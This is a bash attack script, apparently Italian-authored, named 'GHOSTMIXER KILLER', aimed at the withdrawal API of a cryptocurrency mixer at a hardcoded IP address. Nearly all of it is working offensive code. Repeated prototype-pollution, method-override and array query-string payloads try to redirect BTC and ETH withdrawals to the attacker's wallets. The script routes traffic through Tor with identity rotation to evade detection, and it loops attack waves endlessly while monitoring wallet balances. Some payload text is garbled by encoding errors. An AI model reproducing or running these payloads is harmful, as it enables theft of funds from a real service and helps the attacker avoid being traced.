#!/bin/bash
# üî• GHOSTMIXER KILLER v11.0 - WALLET DA FILE + AUTO-DRAIN + TOR PROTECTION

set -e

# ========== CONFIG ==========
TARGET="http://206.189.145.165:3001/api/withdraw"
WALLET_FILE="$HOME/ghostmixer/wallets-fixed.txt"
TOR_PROXY="socks5://127.0.0.1:9050"
TOR_CONTROL="127.0.0.1:9051"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# ========== LOAD WALLETS FROM FILE ==========
load_wallets() {
    if [[ ! -f "$WALLET_FILE" ]]; then
        echo -e "${RED}‚ùå File $WALLET_FILE non trovato!${NC}"
        exit 1
    fi
    
    source "$WALLET_FILE"
    
    if [[ -z "$BTC_WALLET" || -z "$ETH_WALLET" ]]; then
        echo -e "${RED}‚ùå BTC_WALLET o ETH_WALLET mancanti in $WALLET_FILE${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}‚úÖ Wallets caricati:${NC}"
    echo "   üí∞ BTC: $BTC_WALLET"
    echo "   üíé ETH: $ETH_WALLET"
}

# ========== TOR FUNCTIONS ==========
tor_rotate() {
    echo -e "${YELLOW}[TOR]${NC} üîÑ Rotating identity..."
    timeout 5 bash -c "echo -e 'AUTHENTICATE\nsignal NEWNYM\nQUIT' | nc $TOR_CONTROL 2>/dev/null" || true
    sleep 3
    echo -e "${GREEN}[TOR]${NC} ‚úÖ New IP active"
}

tor_check() {
    if ! nc -z 127.0.0.1 9050 2>/dev/null; then
        echo -e "${RED}‚ùå TOR non attivo su 9050! Avvia: systemctl start tor${NC}"
        exit 1
    fi
}

# ========== SPLIT WALLETS ==========
gen_split_wallets() {
    echo -e "${BLUE}[SPLIT]${NC} üé≤ Generando 10 split wallets..."
    rm -f split_wallets.txt
    for i in {1..10}; do
        split_wallet="bc1q$(openssl rand -hex 10 | xxd -r -p | base58)"
        echo "$split_wallet" >> split_wallets.txt
    done
    echo -e "${GREEN}[SPLIT]${NC} ‚úÖ 10 wallets pronti"
}

# ========== CVE EXPLOITS ==========
cve_pollution() {
    echo -e "${YELLOW}[CVE1]${NC} üí• Prototype Pollution..."
    
    # BTC Pollution x3 varianti
    torsocks curl -s -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "constructor[prototype][to]=$BTC_WALLET&constructor[prototype][amount]=1&currency=BTC" \
        -m 10 >/dev/null
    
    torsocks curl -s -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "__proto__[to]=$BTC_WALLET&__proto__[amount]=1¬§cy=BTC" \
        -m 10 >/dev/null
    
    torsocks curl -s -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "__proto__.constructor.prototype.to=$BTC_WALLET&__proto__.constructor.prototype.amount=1" \
        -m 10 >/dev/null
    
    # ETH Pollution
    torsocks curl -s -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "__proto__[to]=$ETH_WALLET&__proto__[amount]=0.5&__proto__[currency]=ETH" \
        -m 10 >/dev/null
    
    echo -e "${GREEN}[CVE1]${NC} ‚úÖ Pollution x4 INJECTED"
}

cve_override() {
    echo -e "${YELLOW}[CVE2]${NC} üîì Method Override..."
    
    torsocks curl -s -X GET "$TARGET" \
        -H "X-HTTP-Method-Override: POST" \
        -H "Content-Type: application/json" \
        -d "{\"to\":\"$BTC_WALLET\",\"amount\":0.3,\"currency\":\"BTC\"}" \
        -m 10 >/dev/null
    
    torsocks curl -s -X GET "$TARGET" \
        -H "_method: POST" \
        -H "Content-Type: application/json" \
        -d "{\"to\":\"$ETH_WALLET\",\"amount\":0.2}" \
        -m 10 >/dev/null
    
    echo -e "${GREEN}[CVE2]${NC} ‚úÖ Override x2 BYPASSED"
}

cve_array_qs() {
    echo -e "${YELLOW}[CVE3]${NC} üì¶ Array QS..."
    
    torsocks curl -s -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "to[]=constructor&to[][prototype][to]=$BTC_WALLET&to[][prototype][amount]=1¬§cy[]=BTC" \
        -m 10 >/dev/null
    
    echo -e "${GREEN}[CVE3]${NC} ‚úÖ Array QS INJECTED"
}

# ========== FULL ATTACK ==========
full_wave() {
    echo -e "${BLUE}üöÄ${NC} === FULL CVE WAVE #$(date +%s) ==="
    cve_pollution
    tor_rotate
    cve_override
    tor_rotate
    cve_array_qs
    echo -e "${GREEN}üéØ${NC} === WAVE COMPLETE ‚úÖ ==="
}

# ========== MONITOR & MIX ==========
monitor_mixer() {
    echo -e "${BLUE}üëÄ${NC} === AUTO-MONITOR START ==="
    gen_split_wallets
    
    while true; do
        # Check BTC
        sats=$(curl -s --socks5 $TOR_PROXY "https://blockstream.info/api/address/$BTC_WALLET" | jq -r '.chain_stats.funded_txo_sum // 0' 2>/dev/null || echo "0")
        
        # Check ETH  
        eth_wei=$(curl -s --socks5 $TOR_PROXY "https://api.etherscan.io/api?module=account&action=balance&address=$ETH_WALLET&tag=latest" | jq -r '.result // 0' 2>/dev/null || echo "0")
        eth_eth=$(echo "scale=6; $eth_wei / 1000000000000000000" | bc -l 2>/dev/null || echo "0")
        
        echo -e "$(date '+%H:%M:%S') | üí∞ BTC: ${sats}sats | üíé ETH: ${eth_eth}ETH"
        
        # VICTORY CHECK
        if [[ $sats != "0" || $eth_eth != "0" ]]; then
            echo -e "${RED}üéâ VITTORIA TOTALE!${NC}"
            echo -e "${RED}üí∞ BTC: ${sats} sats${NC}"
            echo -e "${RED}üíé ETH: ${eth_eth} ETH${NC}"
            
            # SAVE VICTORY
            echo "VICTORY $(date)" > victory_$(date +%s).txt
            echo "BTC: $sats sats -> $BTC_WALLET" >> victory_$(date +%s).txt
            echo "ETH: $eth_eth ETH -> $ETH_WALLET" >> victory_$(date +%s).txt
            cat split_wallets.txt >> victory_$(date +%s).txt
            
            # SPLIT INSTRUCTIONS
            echo -e "${GREEN}üîÑ SPLIT WALLETS:${NC}"
            cat split_wallets.txt
            
            # CONTINUE MONITORING
            sleep 300
        fi
        
        sleep 20
    done
}

# ========== MAIN EXECUTION ==========
main() {
    echo -e "${RED}üíÄ GHOSTMIXER KILLER v11.0 - WALLET AUTO-LOAD${NC}"
    echo "üéØ Target: $TARGET"
    echo "üìÅ Wallets: $WALLET_FILE"
    echo ""
    
    load_wallets
    tor_check
    
    # START MONITOR IN BACKGROUND
    monitor_mixer &
    MONITOR_PID=$!
    
    # INFINITE ATTACK WAVES
    wave_count=0
    while true; do
        ((wave_count++))
        full_wave
        sleep 180  # 3min tra waves
        tor_rotate
    done
}

# Run main
main